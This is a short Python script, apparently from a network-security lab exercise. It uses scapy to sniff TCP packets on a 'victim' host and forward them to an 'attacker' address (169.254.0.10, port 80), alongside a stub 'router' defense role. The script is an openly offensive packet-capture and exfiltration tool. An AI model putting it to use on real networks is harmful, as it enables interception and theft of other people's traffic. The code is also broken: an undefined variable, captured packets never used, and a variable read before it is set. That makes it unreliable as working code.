#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy

packets = []
role = 'victim'

def packet_sniffer(my_filter, my_prn):
    print('Calling packet sniffer function.')
    pkt = sniff(filter=my_filter, count=5, iface='eth1', prn=my_prn)

def packet_storage(packet):
    packets.append(packet)

def defense_model(packet):
    return 0

def send_to_attacker():
    actual_destination = 'DUP_PL_DEST=169.254.0.7'
    for packet in packets:
        new_packet = IP()/TCP()/Raw(load=data)
        new_packet[IP].dst = '169.254.0.10'
    
        new_packet[TCP].dport = 80

        print('new_packet:', new_packet.show())

        r1 = sr1(new_packet, timeout=5)
        


def print_packets():
    for packet in packets:
        print('Packet source IP:', packet[IP].src)
    

if __name__=='__main__':
    if(role == 'victim'):
        local_ip = get_if_addr('eth1')
        packet_sniffer('host ' + local_ip + ' and tcp', packet_storage)
        print_packets()
        send_to_attacker()
    elif(role == 'router'):
        packet_sniffer('dest ' + local_ip + 'tcp', defense_model)
    
